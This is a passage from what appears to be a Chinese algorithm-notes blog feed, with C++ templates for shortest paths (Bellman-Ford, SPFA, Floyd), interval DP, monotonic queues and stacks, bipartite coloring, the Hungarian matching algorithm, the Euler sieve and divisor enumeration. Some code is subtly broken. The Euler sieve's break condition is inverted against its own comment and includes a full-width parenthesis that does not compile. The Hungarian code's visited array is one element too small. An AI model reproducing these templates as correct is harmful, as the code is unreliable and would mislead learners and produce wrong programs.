edges[j][<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> b = edges[j][<span class="hljs-number">1</span>];<br>            <span class="hljs-type">int</span> w = edges[j][<span class="hljs-number">2</span>];<br>            dist[b] = <span class="hljs-built_in">min</span>(dist[b],last[a]+w);<span class="hljs-comment">//保证每次只更新一次，防止串联</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dist[n];<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>spfa：SPFA 算法是 Bellman-Ford算法 的队列优化算法的别称，它的优化思路是利用了搜索的思想，只将对更新了距离的节点加入队列，因为只有更新了距离的节点才对后续的松弛操作有影响。<br>优化方式：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">spfa</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    queue&lt;<span class="hljs-type">int</span>&gt;q;<br>    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);<br>    dist[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<br>    vis[<span class="hljs-number">1</span>]=<span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">while</span>(!q.<span class="hljs-built_in">empty</span>())<br>    &#123;<br>        <span class="hljs-type">int</span> u = q.<span class="hljs-built_in">front</span>();<br>        q.<span class="hljs-built_in">pop</span>();<br>        vis[u]=<span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp;vp:gra[u])<br>        &#123;<br>            <span class="hljs-type">int</span> v = vp.first;<br>            <span class="hljs-type">int</span> d = vp.second;<br>            <span class="hljs-keyword">if</span>(dist[v]&gt;dist[u]+d)<br>            &#123;<br>                dist[v] = dist[u]+d;<br>                <span class="hljs-keyword">if</span>(!vis[v])<br>                &#123;<br>                    q.<span class="hljs-built_in">push</span>(v);<br>                    vis[v] =<span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br></code></pre></td></tr></table></figure><p>和Dijkstra很像，但Dijkstra是贪心，每次更新一点，而spfa是对所有的边都进行松弛。<br>spfa还可以进行判断负环操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">spfa</span><span class="hljs-params">()</span><span class="hljs-comment">//整体思路，dist代表到超级源点的距离。</span></span><br><span class="hljs-function"></span>&#123;<br>    queue&lt;<span class="hljs-type">int</span>&gt;q;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        q.<span class="hljs-built_in">push</span>(i);<br>    &#125;<br>    <span class="hljs-keyword">while</span>(!q.<span class="hljs-built_in">empty</span>())<br>    &#123;<br>        <span class="hljs-type">int</span> u= q.<span class="hljs-built_in">front</span>();<br>        q.<span class="hljs-built_in">pop</span>();<br>        vis[u] =<span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp;vp:gra[u])<br>        &#123;<br>            <span class="hljs-type">int</span> v = vp.first;<br>            <span class="hljs-type">int</span> d = vp.second;<br>            <span class="hljs-keyword">if</span>(dist[v]&gt;dist[u]+d)<br>            &#123;<br>                dist[v] =dist[u]+d;<br>                cnt[v] = cnt[u]+<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">if</span>(cnt[v]&gt;=n) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<span class="hljs-comment">//抽屉原理，边数超过了点数。存在负环。</span><br>                <span class="hljs-keyword">if</span>(!vis[v])<br>                &#123;<br>                    q.<span class="hljs-built_in">push</span>(v);<br>                    vis[v] = <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Floyd算法可以用来解决多源最短路径问题，它的思想基于动态规划。<br>从点i到点j的最短路径，要么由i直接到j，要么是由i经过点k再到达点j。点i到点j的最小值只能从这两种状态转移过来，从而建立动态规划转移方程。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">floyd</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">1</span>;k&lt;=n;k++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>            &#123;<br>                d[i][j] =<span class="hljs-built_in">min</span>(d[i][j],d[i][k]+d[k][j]);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>区间dp</title>
    <link href="/2022/12/30/%E5%8C%BA%E9%97%B4dp/"/>
    <url>/2022/12/30/%E5%8C%BA%E9%97%B4dp/</url>
    
    <content type="html"><![CDATA[<p>例题:<a href="https://www.acwing.com/problem/content/284/">https://www.acwing.com/problem/content/284/</a><br>简易描述：有N堆石子，将N堆石子合并成一堆，只能合并相邻两堆石子，选择的总代价为两堆石子总和。</p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">305</span>;<br><span class="hljs-type">int</span> pre[N];<br><span class="hljs-type">int</span> dp[N][N];<span class="hljs-comment">//合并区间i,j的最小值。</span><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> inf =INT_MAX/<span class="hljs-number">2</span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cin&gt;&gt;pre[i], pre[i] +=pre[i<span class="hljs-number">-1</span>];<br>    <span class="hljs-comment">//枚举区间最小值</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> len=<span class="hljs-number">2</span>;len&lt;=n;len++)<br>    &#123;<br>        <span class="hljs-comment">//枚举左区间</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i+len<span class="hljs-number">-1</span>&lt;=n;i++)<br>        &#123;<br>            <span class="hljs-type">int</span> j =i+len<span class="hljs-number">-1</span>;<span class="hljs-comment">//右端点。</span><br>            dp[i][j] = inf;<span class="hljs-comment">//初始化成最大值</span><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=i;k&lt;=j;k++)<span class="hljs-comment">//枚举中间的分界点</span><br>            &#123;<br>                <span class="hljs-comment">//状态转移计算最小值</span><br>                dp[i][j] =<span class="hljs-built_in">min</span>(dp[i][j],dp[i][k]+dp[k+<span class="hljs-number">1</span>][j]+pre[j]-pre[i<span class="hljs-number">-1</span>]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;dp[<span class="hljs-number">1</span>][n]&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>单调队列单调栈</title>
    <link href="/2022/12/30/%E5%8D%95%E8%B0%83%E9%98%9F%E5%88%97%E5%8D%95%E8%B0%83%E6%A0%88/"/>
    <url>/2022/12/30/%E5%8D%95%E8%B0%83%E9%98%9F%E5%88%97%E5%8D%95%E8%B0%83%E6%A0%88/</url>
    
    <content type="html"><![CDATA[<p>单调队列，用来维护给定大小区间的最值。并且队列中元素之间的关系具有单调性，而且，队首和队尾都可以进行出队操作，只有队尾可以进行入队操作。<br>可以用来维护给定区间的最大（最小值）（滑动窗口）</p><p>单调栈，用来维护最近的大于&#x2F;小于关系，可以维护偏向全局的大小关系。</p><h4 id="单调队列实现"><a href="#单调队列实现" class="headerlink" title="单调队列实现"></a>单调队列实现</h4><h5 id="去尾操作"><a href="#去尾操作" class="headerlink" title="去尾操作"></a>去尾操作</h5><p>用来维护队列的单调性，当有新元素需要入队时，从队尾向前依次移除影响单调性的元素。操作结束后，进行入队。</p><h5 id="删头操作"><a href="#删头操作" class="headerlink" title="删头操作"></a>删头操作</h5><p>用来维护求解区间，当头部元素不在要求求解的区间里时，对头部元素进行删除。</p><h5 id="取解操作"><a href="#取解操作" class="headerlink" title="取解操作"></a>取解操作</h5><p>当进行完上面两步的操作后，那么队头元素即为该区间的极值。</p><p>队列中存的是下标。</p><h5 id="实现形式"><a href="#实现形式" class="headerlink" title="实现形式"></a>实现形式</h5><h6 id="STL"><a href="#STL" class="headerlink" title="STL"></a>STL</h6><p>双向队列</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">deque&lt;<span class="hljs-type">int</span>&gt;que;<br><span class="hljs-built_in">pop_front</span>()<br><span class="hljs-built_in">pop_back</span>()<br></code></pre></td></tr></table></figure><p>等方法删头去尾</p><h6 id="手写"><a href="#手写" class="headerlink" title="手写"></a>手写</h6><p>定义一个长数组</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a[maxn];<span class="hljs-comment">//队列</span><br><span class="hljs-type">int</span> head,tail；<span class="hljs-comment">//队列指针</span><br></code></pre></td></tr></table></figure><h4 id="单调栈实现模板"><a href="#单调栈实现模板" class="headerlink" title="单调栈实现模板"></a>单调栈实现模板</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++">stack&lt;<span class="hljs-type">int</span>&gt; s;<br><span class="hljs-keyword">for</span> (遍历这个数组)<br>&#123;<br><span class="hljs-comment">//当判断是栈顶元素小于当前元素为单调递减栈，相反为单调递增栈</span><br><span class="hljs-keyword">while</span> (栈不为空 &amp;&amp; 栈顶元素小于当前元素)<br>&#123;<br>栈顶元素出栈;<br>更新结果;<br>&#125;<br>当前数据入栈;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h4 id="单调队列实现模板"><a href="#单调队列实现模板" class="headerlink" title="单调队列实现模板"></a>单调队列实现模板</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++">deque&lt;<span class="hljs-type">int</span>&gt;dq;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!dq.<span class="hljs-built_in">empty</span>()&amp;&amp; dq.<span class="hljs-built_in">front</span>() &lt;i-k+<span class="hljs-number">1</span>)<span class="hljs-comment">//最前方元素是否超出范围</span><br>        &#123;<br>            dq.<span class="hljs-built_in">pop_front</span>();<br>        &#125;<br>        <span class="hljs-keyword">while</span>(!dq.<span class="hljs-built_in">empty</span>() &amp;&amp; a[dq.<span class="hljs-built_in">back</span>()]&gt;=a[i])<span class="hljs-comment">//维护某种单调性</span><br>        &#123;<br>            dq.<span class="hljs-built_in">pop_back</span>();<br>        &#125;<br>        dq.<span class="hljs-built_in">push_back</span>(i);<br>        <span class="hljs-keyword">if</span>(i&gt;=k<span class="hljs-number">-1</span>) <span class="hljs-comment">//下标是否达到所需数量。</span><br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,a[dq.<span class="hljs-built_in">front</span>()]);<br>        &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>匈牙利算法</title>
    <link href="/2022/12/30/%E5%8C%88%E7%89%99%E5%88%A9%E7%AE%97%E6%B3%95/"/>
    <url>/2022/12/30/%E5%8C%88%E7%89%99%E5%88%A9%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h4 id="染色法判断二分图"><a href="#染色法判断二分图" class="headerlink" title="染色法判断二分图"></a>染色法判断二分图</h4><p>染色法判断二分图的原理：二分图中不存在奇数环（节点数为奇数的环），因此图中相邻两点颜色均应该不同。可以用此方法来判断二分图。<br>模板题目：<a href="https://www.acwing.com/problem/content/862/">https://www.acwing.com/problem/content/862/</a><br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">1e5</span>+<span class="hljs-number">5</span>;<br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;<span class="hljs-built_in">gra</span>(N,<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;());<br>vector&lt;<span class="hljs-type">int</span>&gt;<span class="hljs-built_in">color</span>(N,<span class="hljs-number">0</span>);<br><span class="hljs-type">int</span> m,n,v,u;<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u,<span class="hljs-type">int</span> c)</span></span><br><span class="hljs-function"></span>&#123;<br>    color[u] = c;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span>&amp;v:gra[u])<span class="hljs-comment">//对所有相邻节点进行染色</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(!color[v])<span class="hljs-comment">//若没被染色</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">dfs</span>(v,<span class="hljs-number">3</span>-c))<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<span class="hljs-comment">//递归染上不同的颜色</span><br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(color[v]!=<span class="hljs-number">3</span>-c)<span class="hljs-comment">//若已被染色，则判断是否颜色不同。</span><br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);<br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;u,&amp;v);<br>        gra[u].<span class="hljs-built_in">push_back</span>(v);<span class="hljs-comment">//无向图</span><br>        gra[v].<span class="hljs-built_in">push_back</span>(u);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!color[i])<br>        &#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">dfs</span>(i,<span class="hljs-number">1</span>))<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Yes&quot;</span>);   <br>&#125;<br></code></pre></td></tr></table></figure><h4 id="匈牙利算法"><a href="#匈牙利算法" class="headerlink" title="匈牙利算法"></a>匈牙利算法</h4><p>匈牙利算法用来求二分图的最大匹配。<br>二分图的匹配：给定一个二分图 G，在 G 的一个子图 M 中，M 的边集 {E} 中的任意两条边都不依附于同一个顶点，则称 M 是一个匹配。<br>二分图的最大匹配：所有匹配中包含边数最多的一组匹配被称为二分图的最大匹配，其边数即为最大匹配数。<br>模板题目：<a href="https://www.acwing.com/problem/content/description/863/">https://www.acwing.com/problem/content/description/863/</a><br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">1001</span>;<br><span class="hljs-type">int</span> n1,n2,m,u,v;<br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;<span class="hljs-built_in">gra</span>(N,<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;());<br>vector&lt;<span class="hljs-type">bool</span>&gt;vis;<br>vector&lt;<span class="hljs-type">int</span>&gt;<span class="hljs-built_in">match</span>(N,<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span>&amp;v:gra[x])<span class="hljs-comment">//遍历所有可能匹配的点</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(!vis[v])<span class="hljs-comment">//如果另一方还没有被考虑</span><br>        &#123;<br>            vis[v]=<span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span>(match[v]==<span class="hljs-number">0</span> || <span class="hljs-built_in">find</span>(match[v]))<span class="hljs-comment">//若另一方没有匹配对象或者其匹配对象能够更换成另外的匹配对像</span><br>            &#123;<br>                match[v] =x;<span class="hljs-comment">//匹配成功</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d%d&quot;</span>,&amp;n1,&amp;n2,&amp;m);<br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;u,&amp;v);<br>        gra[u].<span class="hljs-built_in">push_back</span>(v);<span class="hljs-comment">//只加入一边，当成有向图</span><br>    &#125;<br>    <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n1;i++)<br>    &#123;<br>        vis = <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">bool</span>&gt;(n2,<span class="hljs-literal">false</span>);<span class="hljs-comment">//每次重置，所有另一方被考虑的状态。</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">find</span>(i)) ++res;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,res);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>欧拉筛法</title>
    <link href="/2022/12/30/%E6%AC%A7%E6%8B%89%E7%AD%9B%E6%B3%95/"/>
    <url>/2022/12/30/%E6%AC%A7%E6%8B%89%E7%AD%9B%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>基本知识：<br>1.任何一个素数的倍数一定不是素数。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">1e5</span>+<span class="hljs-number">5</span>;<br><span class="hljs-type">int</span> prime[N],cnt;<br><span class="hljs-type">bool</span> st[N];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ol</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++）<br>   &#123;<br><span class="hljs-keyword">if</span>(!st[i])prime[cnt++] = i;<span class="hljs-comment">//如果i是素数，将其加入素数数组中</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;prime[j]&lt;=n/i;j++)<span class="hljs-comment">//从小到大枚举所有质数。</span><br>&#123;<br>   <span class="hljs-comment">//关于prime[j]&lt;=n/i；</span><br>   <span class="hljs-comment">//若i为合数，当prime[j]枚举到i的最小质因子时便会break掉。</span><br>         <span class="hljs-comment">//若i为质数，则枚举到i便会退出。</span><br>   st[prime[j]*i]=<span class="hljs-literal">true</span>;<span class="hljs-comment">//将 prime[j]*i筛掉</span><br>   <span class="hljs-keyword">if</span>(i%prime[j]) <span class="hljs-keyword">break</span>;<span class="hljs-comment">//若prime[j]是i的最小质因子，则退出。否则继续循环筛数。从而保证每个数，只被它的最小质因子筛掉。</span><br>&#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>约数问题</title>
    <link href="/2022/12/30/%E7%BA%A6%E6%95%B0%E9%97%AE%E9%A2%98/"/>
    <url>/2022/12/30/%E7%BA%A6%E6%95%B0%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h3 id="求约数"><a href="#求约数" class="headerlink" title="求约数"></a>求约数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">y</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt;ans;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=x/i;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(x%i==<span class="hljs-number">0</span>)<span class="hljs-comment">//能整除，为一个约数</span><br>        &#123;<br>            ans.<span class="hljs-built_in">push_back</span>(i);<span class="hljs-comment">//加入答案</span><br>            <span class="hljs-keyword">if</span>(i!=x/i) ans.<span class="hljs-built_in">push_back</span>(x/i);<span class="hljs-comment">//防止加入相同的约数。</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(ans.<span class="hljs-built_in">begin</span>(),ans.<span class="hljs-built_in">end</span>());<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="求约数个数"><a href="#求约数个数" class="headerlink" title="求约数个数"></a>求约数个数</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念:"></a>基本概念:</h4><p>1.算术基本定理:任何一个大于1的自然数 N,如果N不为质数，那么N可以唯一分解成有限个质数的乘积。<br>2.约数定理：一个数分解成有限个质因数的乘积，设质因数指数为a1,a2,a3….<br>则约数的总个数为（a1+1)<em>(a2+1)</em>(a3+1)……。有乘法定理即可简单理解。<br>代码：</p><figure 